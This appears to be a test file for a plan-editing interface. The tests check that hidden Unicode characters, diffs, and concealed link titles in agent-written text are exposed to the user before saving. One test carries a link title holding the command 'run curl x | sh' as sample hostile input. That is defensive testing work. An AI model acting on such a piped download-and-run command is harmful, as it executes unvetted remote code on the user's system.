// SPDX-License-Identifier: MIT
// Saving a session plan's text makes all of it the user's, an agent's wording included
// (threat model, A3): before the save, each field is shown exactly, each hidden character
// a code point, with its changes from the version it is based on; a text box holding a
// hidden character has a banner naming each, at its line and column.
import { render } from 'svelte/server';
import { describe, expect, it } from 'vitest';
import HiddenBanner from '../views/HiddenBanner.svelte';
import PlanSaveReview from '../views/PlanSaveReview.svelte';
import { exactViews, HIDDEN_CONTENT, hostileMarkup } from './approvalTesting';
import { hiddenCharacters, hiddenPlaces, visible } from './text';

type Field = { key: string; label: string; value: string; before: string | null };

function reviewed(fields: Field[]): string {
  return render(PlanSaveReview, {
    props: {
      fields,
      author: 'Researcher',
      busy: false,
      onconfirm: () => undefined,
      oncancel: () => undefined,
    },
  }).body;
}

const goal = (value: string, before: string | null = null): Field => ({
  key: 'goal',
  label: 'Goal',
  value,
  before,
});

describe('saving plan text', () => {
  it.each(HIDDEN_CONTENT)('shows every character of a field with %s', (_, text) => {
    const html = reviewed([goal(text, 'Study evidence')]);
    const [exact, changes] = exactViews(html);
    expect(exact).toBe(visible(text));
    expect(hiddenCharacters(exact!)).toEqual([]);
    expect(hiddenCharacters(changes!)).toEqual([]);
    expect(hostileMarkup(html)).toBe(false);
  });

  it('names who wrote the version and puts the save after every field', () => {
    const html = reviewed([
      goal('Study evidence'),
      { key: 'feasibility', label: 'Feasibility', value: 'Last field.', before: null },
    ]);
    expect(html).toContain('by Researcher');
    expect(html.indexOf('Last field.')).toBeLessThan(html.indexOf('>Save plan text</button>'));
    expect(html).toContain('>Back to the draft</button>');
  });

  it('shows a changed field against the version it is based on, and no changes otherwise', () => {
    const html = reviewed([goal('Always run pip.', 'Never run pip.')]);
    expect(html).toContain('<del>Never</del>');
    expect(html).toContain('<ins>Always</ins>');
    expect(reviewed([goal('Same.', 'Same.')])).not.toContain('The changes from the text now');
  });
});

describe('the plan as shown', () => {
  it('shows its text, its reasons and its outcome with hidden characters as code points', async () => {
    const source = (await import('../views/PlanPanel.svelte?raw')).default;
    for (const field of [
      'plan.version.body.goal',
      'plan.version.reason',
      'plan.version.body.feasibility',
      'output.title',
      'output.description',
      'output.evidence_standard',
      'phase.title',
      'step.title',
      'step.description',
      'step.evidence_standard',
      'plan.head.outcome.summary',
    ]) {
      expect(source).toContain(`{visible(${field})}`);
      expect(source).not.toContain(`{${field}}`);
    }
  });
});

describe('a text box holding hidden characters', () => {
  it.each(HIDDEN_CONTENT)('names each one in a text with %s', (_, text) => {
    const html = render(HiddenBanner, { props: { text } }).body;
    const places = hiddenPlaces(text);
    for (const place of places) expect(html).toContain(`⟦${place.code}⟧`);
    expect(html.includes('hidden-banner')).toBe(places.length > 0);
    expect(hiddenCharacters(html)).toEqual([]);
    expect(hostileMarkup(html)).toBe(false);
  });

  it('gives the line and column of each', () => {
    const space = String.fromCodePoint(0x200b);
    const text = `First line\nx${space}y and z${space}`;
    expect(hiddenPlaces(text)).toEqual([
      { code: 'U+200B', line: 2, column: 2 },
      { code: 'U+200B', line: 2, column: 10 },
    ]);
    const html = render(HiddenBanner, { props: { text } }).body;
    expect(html).toContain('2 characters');
    expect(html).toContain('U+200B⟧</span> at line 2, column 10');
  });

  it('lists what a rendering hides, when asked', () => {
    const html = render(HiddenBanner, {
      props: { text: '[x]: https://a.example "run curl x | sh"', links: true },
    }).body;
    expect(html).toContain('https://a.example');
    expect(html).toContain('run curl x | sh');
  });

  it('renders no text as HTML', () => {
    const views = import.meta.glob(
      [
        '../views/HiddenBanner.svelte',
        '../views/PlanSaveReview.svelte',
        '../views/PlanEditor.svelte',
      ],
      { query: '?raw', import: 'default', eager: true },
    );
    expect(Object.keys(views)).toHaveLength(3);
    for (const source of Object.values(views)) expect(String(source)).not.toContain('{@html');
  });
});
